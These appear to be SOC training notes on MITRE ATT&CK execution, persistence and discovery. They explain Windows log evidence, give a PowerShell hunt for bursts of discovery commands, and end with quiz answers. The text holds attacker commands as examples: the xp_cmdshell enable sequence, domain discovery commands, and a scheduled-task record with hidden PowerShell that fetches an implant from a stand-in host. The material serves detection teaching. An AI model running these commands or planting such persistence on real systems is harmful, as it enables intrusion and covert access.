Stage the attacker reached What clean-up looks like Exploit blocked or caught at first process Close the hole, verify, done Code ran, no persistence Isolate, kill process, patch, check for stolen data Persistence installed Find and remove every mechanism, or rebuild the host Credentials stolen, lateral movement Many hosts, password/ticket resets, possibly domain-wide recovery

That is why catching execution and persistence early is worth so much effort.

docs.title: ATT&CK: tactics, techniques, sub-techniques
docs.text:
MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a public knowledge base built from real intrusions. Its structure is simple once you see it:

  • Tactic = the attacker's short-term goal — why they do something. Example: Persistence (TA0003).
  • Technique = a way to reach that goal — how. Example: T1053 Scheduled Task/Job.
  • Sub-technique = a more specific variant. Example: T1053.005 Scheduled Task (Windows Task Scheduler), as opposed to T1053.003 Cron on Linux.

The current Enterprise tactics, roughly in the order an intrusion uses them:

ID Tactic One-line meaning TA0043 Reconnaissance Learn about the target from outside TA0042 Resource Development Build infrastructure, accounts, tools TA0001 Initial Access Get in TA0002 Execution Run code TA0003 Persistence Keep access TA0004 Privilege Escalation Get higher rights TA0005 Stealth Avoid being noticed (blend in, hide, masquerade) TA0112 Defense Impairment Break or blind security tools and logging TA0006 Credential Access Steal passwords, hashes, tickets, tokens TA0007 Discovery Learn the environment from inside TA0008 Lateral Movement Move to other systems TA0009 Collection Gather the data they want TA0011 Command and Control Talk to their infrastructure TA0010 Exfiltration Take the data out TA0040 Impact Encrypt, destroy, disrupt

(Older material, and many detection rules, still say Defense Evasion for TA0005 — that tactic was split into Stealth and Defense Impairment in 2026; see the 2026 view below.)

Each technique page explains how the behaviour works, which threat groups and malware used it, and how to mitigate and detect it. That is why many teams treat the matrix as a coverage checklist: "for each technique relevant to us, do we have the data and a detection?" In practice you will never cover every cell equally — some techniques are nearly invisible, some are normal admin activity — but as a way to find blind spots and to talk about detections in a shared language it is excellent.

[Supplement] How a SOC actually uses technique IDs

  • Tag every detection rule with its technique ID(s). Then you can draw a heat map of what you cover and what you don't.
  • Tag alerts and incident timelines too: "T1059.001 at 07:42, T1547.001 at 07:43, T1087.002 at 07:45" tells the next analyst the story at a glance.
  • Use it for threat-informed priorities: if threat reports for your sector keep showing T1053.005 and T1021.002, those are your first detections to build and test.

docs.title: The payload rides in with the exploit
docs.text:
An exploit is just the trick that makes a program misbehave. On its own it does nothing useful for the attacker — so it carries a payload: the first instructions the hijacked process should run. If the exploit works, the payload runs immediately, with the process's identity.

Analogy: the exploit is the crowbar that opens the window; the payload is the burglar climbing through it. A crowbar alone steals nothing.

Typical payloads:

  • A plain command shell — the hijacked process starts cmd.exe, powershell.exe or /bin/sh, and the attacker types commands over a network connection (a "reverse shell" if the victim connects out to the attacker, a "bind shell" if the victim listens).
  • A full C2 agent ("implant") — a richer payload like Meterpreter (from the Metasploit framework) or the agents of other C2 frameworks. These offer built-in commands for uploading/downloading files, screenshots, process migration, credential theft and pivoting, often running entirely in memory inside the original process.
  • A small "stager" — just enough code to download and start the real implant (a second stage).

Once the attacker has any of these, they use it as a foothold: download more tools, run them, and move on to persistence and discovery. Whether a full shell is possible at all depends on the exploit: some only let the attacker run a single command, or land them in a restricted environment.

Relevant ATT&CK: T1059 Command and Scripting Interpreter (.001 PowerShell, .003 Windows Command Shell, .004 Unix Shell), T1106 Native API, T1047 Windows Management Instrumentation, T1569.002 Service Execution, T1204 User Execution (for client-side).

docs.title: Breaking out of an interpreter: the xp_cmdshell case
docs.text:
Not every entry gives a shell. Suppose the attacker guesses the sa password of a Microsoft SQL Server, or exploits a SQL injection in a web app. They are now at a SQL prompt — they can query tables, but they can't type whoami. So they look for a feature of the environment itself that runs OS commands.

SQL Server has exactly such a feature: the extended stored procedure xp_cmdshell. It takes a string, starts a Windows command shell, passes the string to it, and returns the output as rows. It is disabled by default (since SQL Server 2005), but anyone with sysadmin rights can switch it on. What a defender would see an attacker type at the SQL prompt:

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
  • Line 1 — sp_configure 'show advanced options', 1 makes advanced settings visible; RECONFIGURE applies it. Needed because xp_cmdshell is an "advanced" option.
  • Line 2 — switches xp_cmdshell from 0 (off) to 1 (on) and applies it.
  • Line 3 — runs whoami in a real Windows shell. The result comes back as a one-column table:
output
-----------------------------
nt service\mssqlserver
NULL

nt service\mssqlserver is the SQL Server service identity — that's who the attacker now is on the OS (the trailing NULL row is normal). If the service ran as LocalSystem or a domain admin account (it happens), this one line would be a full compromise.

Analogy: a hotel guest can't enter the kitchen, but room service will cook whatever you write on the order card. xp_cmdshell is room service for the operating system.

Where it shows up in logs:

  1. SQL Server's own messages. Changing the option writes event 15457 to the Windows Application log (source MSSQLSERVER), and the same line goes to the SQL Server ERRORLOG:

    Log Name:   Application
Source:     MSSQLSERVER
Event ID:   15457
Computer:   SRV-SQL-0004.corp.example
Message:    Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
    • Event ID 15457 — "a server configuration option was changed". Fires for any sp_configure change; it's rare in production, so any 15457 naming xp_cmdshell deserves a look.
    • changed from 0 to 1 — it was off and is now on. Attackers often switch it back to 0 afterwards; you'd then see a second 15457 "from 1 to 0" minutes later — a strong sign of deliberate use.

  2. Process creation — the decisive evidence, 4688 on the SQL server:

    EventID:            4688
Computer:           SRV-SQL-0004.corp.example
NewProcessName:     C:\Windows\System32\cmd.exe
CommandLine:        "cmd.exe" /c whoami
ParentProcessName:  C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
TargetUserName:     MSSQLSERVER
TargetDomainName:   NT SERVICE
    • ParentProcessName … sqlservr.exe — the database engine started a shell. Like w3wp.exe → cmd.exe, a database engine spawning a shell is almost never legitimate (some old maintenance jobs do it; baseline them and alert on the rest).
    • CommandLine "cmd.exe" /c whoami — xp_cmdshell always wraps the string in cmd.exe /c, so this shape is characteristic.
    • TargetUserName/TargetDomainName NT SERVICE\MSSQLSERVER — the identity the shell runs as: what was compromised.

The same idea applies elsewhere: a web admin console with a "run diagnostic" box, a CI/CD server's build script, a monitoring tool's "custom check", a router's debug shell. Any feature that runs commands is an execution path. ATT&CK covers many of these under T1059 and, for SQL stored procedures used to keep access, T1505.001 SQL Stored Procedures (Persistence).

docs.title: Why application control is so effective
docs.text:
Execution is the bottleneck of the whole attack: no tool runs, no credentials get dumped, nothing gets encrypted. Application control (allow-listing) means only approved programs and scripts may run — by publisher signature, path or hash. Windows offers AppLocker and App Control for Business (formerly WDAC); Linux has tools such as fapolicyd.

It helps twice:

  • Prevention — the attacker's dropped svc_update.exe in C:\Users\Public\ simply doesn't start.
  • Detection — the block is logged. Legitimate users rarely trip a well-tuned policy, so a block on a server or an admin's machine is a high-signal early alarm, often the first sign of an intrusion.

An AppLocker block, from the log Microsoft-Windows-AppLocker/EXE and DLL:

Event ID:  8004
Level:     Error
Computer:  LT-FIN-0117.corp.example
User:      CORP\p.nguyen
Message:   %OSDRIVE%\USERS\PUBLIC\SVC_UPDATE.EXE was prevented from running.
PolicyName: EXE
RuleName:  -
FilePath:  %OSDRIVE%\USERS\PUBLIC\SVC_UPDATE.EXE
FileHash:  9C2E…77A1
Fqbn:      -
  • Event ID 8004 — blocked (enforced). 8003 is the same in audit-only mode ("would have been prevented"); 8002 means allowed. Attackers care because 8004 means their tool failed and they were seen.
  • User — who tried to run it. A finance user launching an EXE from C:\Users\Public is not normal.
  • FilePath — C:\Users\Public is world-writable — a favourite drop location.
  • Fqbn: - — "fully qualified binary name" is empty: the file is not signed by any publisher.
  • FileHash — pivot into EDR or threat intelligence to see if the file exists elsewhere.

App Control for Business writes the equivalent events to Microsoft-Windows-CodeIntegrity/Operational (3077 = blocked, 3076 = audit). The endpoint-defence section covers application control and its bypasses in detail.

docs.title: To persist or not to persist
docs.text:
Persistence means making sure access survives: a reboot, the user logging off, the exploited process crashing, the antivirus deleting one file. It isn't automatic — it's a choice with a cost.

Analogy: a burglar who wants to come back can hide a spare key under the doormat and copy the alarm code. That makes the next visit easy — but a spare key is something a careful home-owner can find, and finding it tells them they were burgled.

Reasons to persist Reasons not to Long campaigns need access over weeks or months Every persistence mechanism is a change that tools can detect Re-exploiting is risky (more noise) and may stop working (patched, user won't click again) If the original hole stays open (service-side), they can just come back Survive reboots, log-offs, password changes Stealth is the top priority for some missions Survive partial clean-up (AV removes one file) Short "smash and grab" operations (e.g. quick data theft) don't need it

So, connecting to the previous page: attackers who came in client-side (needing a user to click) are more likely to persist quickly, while attackers with a repeatable service-side hole may skip it.

docs.title: Layered persistence and failed remediation
docs.text:
A careful attacker rarely relies on one mechanism. A realistic setup on LT-FIN-0117:

  1. A Run key starts the implant every time the user logs on.
  2. A scheduled task runs every hour, checks whether the implant file still exists, and re-downloads it if not.
  3. Optionally, a WMI event subscription or a service as a third copy.

Now the SOC finds the implant via an AV alert, deletes the file and the Run key, and closes the ticket. An hour later the scheduled task fetches a fresh copy. Remediation failed — and worse, the attacker now knows they were noticed. The lesson: when you find one persistence mechanism, assume there are others and sweep for all common types, or rebuild the host.

The common Windows mechanisms and their evidence:

Mechanism ATT&CK Where it lives Best evidence Run / RunOnce keys T1547.001 HKCU\…\CurrentVersion\Run, HKLM\…\Run Sysmon 13 (registry value set), EDR, autoruns sweep Startup folder T1547.001 %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup Sysmon 11 (file create) Scheduled task T1053.005 C:\Windows\System32\Tasks\, registry TaskCache 4698 (task created), Task Scheduler Operational 106 New service T1543.003 HKLM\SYSTEM\CurrentControlSet\Services 7045 (System log), 4697 (Security log) WMI event subscription T1546.003 WMI repository Sysmon 19/20/21, WMI-Activity Operational 5861 New local/domain account T1136 SAM / AD 4720 (user created), 4732/4728 (added to group) Linux: cron, systemd unit, authorized_keys T1053.003, T1543.002, T1098.004 /etc/cron*, /etc/systemd/system/, ~/.ssh/ auditd file watches, FIM

Let's read the three most common records.

docs.title: Evidence 1: a Run key (Sysmon 13)
docs.text:
Event ID: 13   Registry value set
UtcTime:      2026-11-19 07:43:05.118
ProcessId:    9020
Image:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
EventType:    SetValue
TargetObject: HKU\S-1-5-21-1111111111-2222222222-3333333333-1604\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync
Details:      C:\Users\p.nguyen\AppData\Roaming\OneDriveSync\odsync.exe
User:         CORP\p.nguyen
  • Event ID 13 — Sysmon "registry value set": a value was written (needs a Sysmon config that watches Run keys; most good configs do).
  • Image … powershell.exe — PowerShell wrote it. Real installers are usually msiexec.exe or the product's own setup program; a script host writing a Run key is suspicious.
  • TargetObject — HKU\<SID>\…\Run\OneDriveSync: the current user's Run key, value name OneDriveSync. The name imitates a real product — a masquerading trick.
  • Details — the program that will start at every log-on: an EXE in AppData\Roaming, not in Program Files where the real OneDrive lives.
  • ProcessId 9020 — pivot to that process's creation event to see who started PowerShell (often Office or a downloaded file, as on the previous page).

To check a host directly:

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    MicrosoftEdgeAutoLaunch    REG_SZ    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window
    OneDriveSync    REG_SZ    C:\Users\p.nguyen\AppData\Roaming\OneDriveSync\odsync.exe
  • reg query "<key>" — list every value under that key.
  • Each line is name type data. REG_SZ = a text value. The first entry is a normal Edge start-up item; the second is the attacker's.

docs.title: Evidence 2: a scheduled task (4698)
docs.text:
Event 4698 — "A scheduled task was created" — is written to the Security log when Audit Other Object Access Events is enabled. Attackers love scheduled tasks because they can run as SYSTEM, on a timer, at boot or at log-on, and look like normal maintenance. The event includes the full task XML, which is gold:

EventID:          4698
Computer:         LT-FIN-0117.corp.example
SubjectUserName:  p.nguyen
SubjectDomainName: CORP
TaskName:         \Microsoft\Windows\Maintenance\SyncHealth
TaskContent:
  <Task>
    <Triggers>
      <TimeTrigger>
        <Repetition><Interval>PT1H</Interval></Repetition>
        <StartBoundary>2026-11-19T07:44:00</StartBoundary>
      </TimeTrigger>
    </Triggers>
    <Principals><Principal><UserId>CORP\p.nguyen</UserId></Principal></Principals>
    <Settings><Hidden>true</Hidden></Settings>
    <Actions>
      <Exec>
        <Command>powershell.exe</Command>
        <Arguments>-w hidden -c "if(!(Test-Path $env:APPDATA\OneDriveSync\odsync.exe)){iwr https://cdn.sync-health.example/o.bin -OutFile $env:APPDATA\OneDriveSync\odsync.exe}"</Arguments>
      </Exec>
    </Actions>
  </Task>
  • SubjectUserName p.nguyen — who created the task. A normal user creating a task under \Microsoft\Windows\… is odd; that folder is where Windows' own tasks live, so the attacker is hiding among them.
  • TaskName …\Maintenance\SyncHealth — a name designed to look boring.
  • TimeTrigger + Repetition Interval PT1H — run every hour (PT1H is ISO 8601 for "period of 1 hour").
  • Principal UserId — it runs as p.nguyen (if it said S-1-5-18, it would run as SYSTEM).
  • Hidden true — hidden from the default Task Scheduler view.
  • Actions/Exec — the payload: hidden PowerShell that checks whether odsync.exe exists, and if not, downloads it again. This is exactly the "re-download if deleted" layer.

docs.title: Evidence 3: a new service (7045 / 4697)
docs.text:
Event 7045 — "A service was installed in the system" — lands in the System log, logged by the Service Control Manager; 4697 is the Security-log equivalent (needs Audit Security System Extension). Services start at boot, usually as SYSTEM, so they're both persistence and privilege.

Log Name:     System
Source:       Service Control Manager
Event ID:     7045
Computer:     SRV-FILE-0003.corp.example
Service Name: Windows Telemetry Helper
Service File Name: C:\ProgramData\WinTel\wtelhlp.exe -k netsvcs
Service Type: user mode service
Service Start Type: auto start
Service Account: LocalSystem
  • Service Name — a reassuring, Microsoft-sounding name.
  • Service File Name — the binary in C:\ProgramData, a writable folder, with -k netsvcs tacked on to look like a svchost.exe service. Real Windows services live in System32.
  • auto start — starts at every boot.
  • LocalSystem — runs with the highest local privilege.

The persistence reference collects more mechanisms; the important-events section later in these notes covers 4698 and 7045 in depth.

docs.title: Why attackers need it
docs.text:
After the exploit the attacker usually knows very little: an IP, a hostname, an account. To reach their goal (data, domain admin, a specific system) they must map the place from the inside. Picture a burglar in a dark office building: they read the floor plan by the lift, the names on the doors, the organisation chart on the wall, and which doors have card readers. Discovery is exactly that, done with commands.

What they look for, the built-in tools they use, and the ATT&CK technique:

Question Typical built-in commands ATT&CK Who am I, what privileges? whoami /all, id T1033 System Owner/User Discovery Which accounts exist? net user, net user /domain, Get-ADUser T1087 Account Discovery (.001 local, .002 domain) Which groups, who are the admins? net localgroup administrators, net group "Domain Admins" /domain T1069 Permission Groups Discovery What is this machine? systeminfo, hostname, uname -a T1082 System Information Discovery Network config, domain controllers ipconfig /all, route print, nltest /dclist: T1016 System Network Configuration Discovery Domain trusts nltest /domain_trusts T1482 Domain Trust Discovery Running processes / security tools tasklist /v, ps aux T1057 Process Discovery, T1518.001 Security Software Discovery Connections and listening services netstat -ano, ss -tunap T1049 System Network Connections Discovery Services sc query, systemctl list-units T1007 System Service Discovery Files and folders dir /s /b *.xlsx, tree, find / -name "*.kdbx" T1083 File and Directory Discovery Shares net view \\SRV-FILE-0003, net share T1135 Network Share Discovery Other hosts net view, arp -a, ping sweeps T1018 Remote System Discovery Installed software wmic product get name (deprecated), registry Uninstall keys T1518 Software Discovery

docs.title: Living off the land — why it's hard to catch
docs.text:
Using what's already on the box is called living off the land. Attackers like it because:

  • Nothing new is dropped — no file for antivirus to scan; the binaries are signed by Microsoft.
  • It blends in — admins, help-desk scripts, inventory agents and installers run whoami, ipconfig, net, tasklist all day.
  • Alerting on each command would flood the SOC. A rule "alert on whoami" on 5,000 machines produces thousands of false positives a day and gets switched off. So in many environments discovery goes completely unhindered.

To show what an attacker learns, here is one command and its output:

C:\> net group "Domain Admins" /domain
The request will be processed at a domain controller for domain corp.example.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            adm.lee                  svc_backup
The command completed successfully.
  • net group "<name>" /domain — ask a domain controller for the members of a domain group.
  • Members — the attacker now knows the three accounts worth stealing. Note svc_backup: a service account in Domain Admins is a classic weak point (its password is often old and stored in scripts). Their next steps (credential access, lateral movement) target exactly these names.

docs.title: Detecting discovery: look for the burst
docs.text:
Since single commands are noise, detect the pattern: many different discovery commands, from one parent process or one account, within a few minutes. Here is what 4688 (or Sysmon 1) shows on LT-FIN-0117 after the implant starts:

07:45:02  CORP\p.nguyen  parent=odsync.exe  whoami.exe /all
07:45:04  CORP\p.nguyen  parent=odsync.exe  ipconfig.exe /all
07:45:07  CORP\p.nguyen  parent=odsync.exe  net.exe user p.nguyen /domain
07:45:11  CORP\p.nguyen  parent=odsync.exe  net.exe group "Domain Admins" /domain
07:45:15  CORP\p.nguyen  parent=odsync.exe  nltest.exe /dclist:corp.example
07:45:19  CORP\p.nguyen  parent=odsync.exe  nltest.exe /domain_trusts
07:45:26  CORP\p.nguyen  parent=odsync.exe  tasklist.exe /v
07:45:31  CORP\p.nguyen  parent=odsync.exe  netstat.exe -ano
07:45:40  CORP\p.nguyen  parent=odsync.exe  cmd.exe /c dir /s /b \\SRV-FILE-0003\finance\*.xlsx

Reading it as an analyst:

  • Nine different discovery commands in 38 seconds — no human types that fast and that systematically; it's a script or an operator working from a checklist.
  • Same parent: odsync.exe — an unknown program in AppData (the one from the Run key above) is running admin commands. Legitimate admin tools have known parents (explorer.exe for a person at a prompt, or a known management agent).
  • Same user, a finance user — finance staff don't normally run nltest /domain_trusts.
  • The order tells the story: who am I → what network → what's my account → who are the admins → where are the DCs → what trusts → what security software is running → what connections → where are the spreadsheets. That's T1033 → T1016 → T1087.002 → T1069.002 → T1018/T1482 → T1057/T1518.001 → T1049 → T1083/T1135.

A simple PowerShell hunt for this pattern over the Security log of one host:

$disc = 'whoami.exe','net.exe','net1.exe','nltest.exe','ipconfig.exe','systeminfo.exe','tasklist.exe','netstat.exe','quser.exe','arp.exe'
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddHours(-24)} |
  ForEach-Object { $x=[xml]$_.ToXml(); $d=@{}; $x.Event.EventData.Data | % { $d[$_.Name]=$_.'#text' }
    [pscustomobject]@{Time=$_.TimeCreated; Parent=$d.ParentProcessName; Child=Split-Path $d.NewProcessName -Leaf} } |
  Where-Object { $disc -contains $_.Child } |
  Group-Object Parent | Where-Object { ($_.Group.Child | Sort-Object -Unique).Count -ge 4 } |
  Select-Object Count, Name, @{n='Commands';e={($_.Group.Child | Sort-Object -Unique) -join ','}}

Line by line:

  1. $disc = … — the list of common discovery binaries to watch (net1.exe is what net.exe actually calls for some subcommands).
  2. Get-WinEvent -FilterHashtable @{…} — read only Security-log events with ID 4688 from the last 24 hours (the hashtable filter is fast because Windows filters before PowerShell sees the events).
  3. ForEach-Object { $x=[xml]$_.ToXml() … } — turn each event into XML and copy its EventData fields into a hashtable $d, so we can use names like $d.ParentProcessName.
  4. [pscustomobject]@{…} — keep just the time, the parent path and the child's file name (Split-Path -Leaf cuts C:\Windows\System32\ off).
  5. Where-Object { $disc -contains $_.Child } — keep only discovery binaries.
  6. Group-Object Parent — bucket them by parent process; Where-Object { … -ge 4 } keeps parents that ran at least four different discovery tools.
  7. Select-Object … — print the count, the parent and the list of distinct tools.

Output:

Count Name                                                     Commands
----- ----                                                     --------
   14 C:\Users\p.nguyen\AppData\Roaming\OneDriveSync\odsync.exe arp.exe,ipconfig.exe,net.exe,netstat.exe,nltest.exe,tasklist.exe,whoami.exe
    6 C:\Program Files\InventoryAgent\invagent.exe             ipconfig.exe,systeminfo.exe,netstat.exe,whoami.exe

The second row is a known inventory agent — baseline it (add to an exclusion list after confirming). The first row is the intrusion. In a SIEM you would build the same logic across all hosts: distinct count of discovery commands per parent (or per user) per host in a short window, above a threshold, excluding known tools.

[Supplement] Other discovery signals worth having

  • Domain-wide queries from a workstation: net group … /domain, nltest /dclist, nltest /domain_trusts are rare from ordinary user machines.
  • AD enumeration tools (BloodHound collectors, AdFind, PowerView-style scripts) make a burst of LDAP queries to domain controllers; EDR on the DC, LDAP query logging, or a honeytoken account that "nobody should ever look up" can catch them.
  • Service accounts doing interactive things — a SQL or web service identity running net user /domain is almost never legitimate.
  • Linux: id; uname -a; cat /etc/passwd; sudo -l; ps aux; ss -tunap in quick succession from a web server user (www-data) — see the auditd and process-creation pages later.

docs.title: Putting it together: the first five minutes
docs.text:
Time What happened Tactic / technique Evidence 07:41:58 Word opens a macro document, starts hidden PowerShell Execution, T1204.002 → T1059.001 Sysmon 1, 4688, 4104 07:42:30 PowerShell downloads odsync.exe into AppData\Roaming Command and Control, T1105 Sysmon 3, Sysmon 11, proxy log 07:43:05 Run key OneDriveSync created Persistence, T1547.001 Sysmon 13 07:43:50 Hourly hidden task created that re-downloads the implant Persistence, T1053.005 4698 07:45:02–40 Nine discovery commands from odsync.exe Discovery, T1033/T1087/T1069/T1482/T1083… 4688 / Sysmon 1 burst

Five minutes, three tactics, and every step left a record — if the logging is on. The defensive point: an alert at 07:41 (Office → PowerShell) or 07:43 (script host writes a Run key) is far cheaper than an alert at 07:45 — and much cheaper than finding this a month later.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

The ideas on this page are unchanged and central to modern detection: ATT&CK is still the common language of SOCs and detection vendors, and "tag every rule with technique IDs" is standard practice. Execution through shells, script hosts and environment features like xp_cmdshell is still everyday attacker behaviour, and database engines spawning shells remain a reliable detection. Persistence is still a trade-off, layered persistence still defeats partial clean-up, and Run keys, scheduled tasks and services are still the most common Windows mechanisms. Discovery is still dominated by built-in commands, and burst/sequence detection is how EDR and SIEM content catches it.

[Changed] What has changed

  • ATT&CK restructured. In v19 (April 2026) the old Defense Evasion tactic was split: Stealth keeps the ID TA0005 (blending in, masquerading, obfuscation, LOLBins) and the new Defense Impairment (TA0112) covers breaking security tools and logging. The old T1562 Impair Defenses technique was revoked and its sub-techniques reissued under new IDs (e.g. T1685 Disable or Modify Tools). v18 (late 2025) had already replaced data sources with detection strategies and analytics, and v20 (October 2026) continued adding content (including AI-related abuse). The Execution, Persistence and Discovery techniques used on this page were not renumbered in v19.
  • C2 beyond Meterpreter. Meterpreter is still around, but real intrusions more often use other C2 frameworks (commercial ones like Cobalt Strike, open-source ones like Sliver and Havoc) — or skip custom implants and use legitimate remote-management (RMM) tools such as remote-support agents as both execution and persistence (ATT&CK T1219 Remote Access Tools). Signed, legitimate software is harder to block and to flag.
  • Persistence moved into identity and cloud too. In hybrid environments attackers persist by adding MFA methods, OAuth app consents, app-registration credentials, mailbox forwarding rules or federation trusts — none of which touches a Windows host. Your persistence hunt must include identity-provider audit logs.
  • Speed. Ransomware operators now often run their whole discovery checklist (and AD collection) within minutes of access, so discovery detections need to fire in near real time.

[Caution] Where the old way is wrong or risky today

  • Don't alert on single discovery commands. It floods the queue and the rule gets disabled; detect bursts, unusual parents and unusual accounts instead.
  • Don't close an incident after removing one persistence mechanism. Sweep for all common types (Run keys, Startup folder, tasks, services, WMI, accounts, RMM tools, identity-side persistence), or rebuild.
  • Check your rule mappings. Rules and dashboards still tagged "Defense Evasion" or T1562 need remapping to Stealth / Defense Impairment and the new technique IDs, or your coverage reports will be wrong.
  • Never enable xp_cmdshell "temporarily" for a job and forget it, and don't run SQL Server as LocalSystem or a domain admin. Alert on event 15457 for xp_cmdshell and on sqlservr.exe spawning shells.
  • Audit mode isn't protection. Many organisations leave application control in audit-only (8003/3076) for years. Audit events are useful telemetry, but they stop nothing.

docs.title: Question 1
docs.text:
On SRV-SQL-0004 you see, two minutes apart: an Application-log event 15457 "Configuration option 'xp_cmdshell' changed from 0 to 1", then a 4688 with ParentProcessName = …\sqlservr.exe, CommandLine = "cmd.exe" /c net user /domain, TargetUserName = svc_sql, TargetDomainName = CORP. Ten minutes later, another 15457 "from 1 to 0". What happened, which tactics are involved, and why does the account matter?

Answer and explanation

Someone with sysadmin rights on the SQL Server (stolen sa password, SQL injection as a privileged login, or a compromised DBA account) switched on xp_cmdshell, used it to break out of the SQL interpreter into a real Windows shell (Execution, T1059.003 via SQL Server), ran net user /domain to list domain accounts (Discovery, T1087.002), and then switched it back off to hide the change. The on → use → off sequence is a strong sign of deliberate, hands-on-keyboard abuse, not a forgotten maintenance job.

The account matters because it is what the attacker now is on the OS: CORP\svc_sql is a domain service account, so the attacker can query AD and possibly reach other servers with it. If that account has broad rights (or is in Domain Admins), this is already a domain-level incident. Next steps: find how they got sysadmin (SQL logins, injection in an app), reset svc_sql, check where else it logged on, and hunt for what else the shell ran.

docs.title: Question 2
docs.text:
The SOC found odsync.exe via an antivirus alert, deleted it and the OneDriveSync Run key, and closed the case. Two hours later the same alert fires on the same laptop. Explain the most likely reason and how the analyst should have handled the first case.

Answer and explanation

The attacker used layered persistence. Most likely a scheduled task (like the hourly hidden task in the 4698 example) checks whether odsync.exe exists and re-downloads it if it's gone — so removing the file and Run key only triggered the re-download. Other candidates: a service, a WMI subscription, a Startup-folder item, or a remote-management tool the attacker installed.

Correct handling: when one persistence mechanism is found, assume there are more. Look at the process tree and timeline around the original infection (what created the file? what else did that process write — Sysmon 11/13, 4698, 7045, 4720?), sweep all common autostart locations (an autoruns-style tool or EDR query), check the proxy logs for the download domain from other hosts, and either remove all mechanisms and verify over time, or re-image the laptop. Also consider credentials used on that machine as exposed.

docs.title: Question 3
docs.text:
A colleague proposes a SIEM rule: "Alert whenever whoami.exe, net.exe or ipconfig.exe is executed." Why is this a bad rule, and what would you propose instead? Give at least three conditions that make discovery activity suspicious.

Answer and explanation

These are living-off-the-land tools that admins, scripts, installers and inventory agents run constantly. On thousands of machines the rule would fire thousands of times a day; analysts would learn to ignore it and it would be switched off — and real discovery would still be missed in the noise.

Better: detect the pattern, not the command. For example, alert when, on one host, four or more different discovery tools run within a few minutes from the same parent process or account, excluding baselined management agents. Conditions that raise suspicion:

  • An unusual parent — an unknown binary in AppData/ProgramData/Temp, Office, a web server worker (w3wp.exe) or database engine (sqlservr.exe).
  • An unusual account — a service account or a non-IT user running domain queries (net group "Domain Admins" /domain, nltest /domain_trusts).
  • Speed and order — many commands in seconds, following the classic who-am-I → network → accounts → admins → DCs → trusts sequence.
  • Domain-wide queries from a workstation, or bursts of LDAP queries to DCs.
  • Discovery that follows another alert on the same host (Office → PowerShell, a new Run key) — combine signals.
